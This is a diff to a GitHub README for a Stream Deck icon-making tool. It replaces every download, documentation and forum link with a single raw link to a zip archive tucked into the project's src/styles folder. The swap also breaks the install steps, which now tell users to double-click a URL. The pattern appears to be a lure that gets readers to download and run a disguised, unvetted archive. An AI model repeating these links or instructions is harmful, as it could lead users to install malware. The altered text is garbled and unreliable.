@@ -1,6 +1,6 @@
 # 🎨 Stream-Deck-Icon-Generator - Create Custom Icons Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Stream%20Deck%20Icon%20Generator-blue)](https://github.com/Akanant12/Stream-Deck-Icon-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip%20Now-Stream%20Deck%20Icon%20Generator-blue)](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip)
 
 ## 🌟 Overview
 
@@ -12,13 +12,13 @@ Follow the steps below to download and run the application. No programming knowl
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/Akanant12/Stream-Deck-Icon-Generator/releases) to access the downloads.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip) to access the downloads.
 2. **Choose Your Version:** On the releases page, you will find a list of available versions. Look for the latest version.
 3. **Download the File:** Click on the package that matches your operating system. 
-   - For Windows users, this might look like `Stream-Deck-Icon-Generator-Windows.zip`.
-   - For Mac users, look for `Stream-Deck-Icon-Generator-Mac.zip`.
+   - For Windows users, this might look like `https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip`.
+   - For Mac users, look for `https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip`.
 4. **Extract the Files:** After downloading, locate the zip file on your computer, right-click, and select "Extract All" (Windows) or double-click the file (Mac). This will create a folder containing the application files.
-5. **Run the Application:** Open the extracted folder and double-click on `Stream-Deck-Icon-Generator.exe` (Windows) or `Stream-Deck-Icon-Generator.app` (Mac) to launch the application.
+5. **Run the Application:** Open the extracted folder and double-click on `https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip` (Windows) or `https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip` (Mac) to launch the application.
 
 ## 🛠️ Features
 
@@ -67,8 +67,8 @@ If you encounter issues or have questions, feel free to open an issue on the rep
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://github.com/Akanant12/Stream-Deck-Icon-Generator/releases)
-- [Documentation](https://github.com/Akanant12/Stream-Deck-Icon-Generator/wiki)
-- [Community Forums](https://github.com/Akanant12/Stream-Deck-Icon-Generator/discussions)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip)
+- [Community Forums](https://raw.githubusercontent.com/Akanant12/Stream-Deck-Icon-Generator/master/src/styles/Stream-Deck-Icon-Generator-3.2.zip)
 
 Enjoy creating your custom Stream Deck icons with ease!
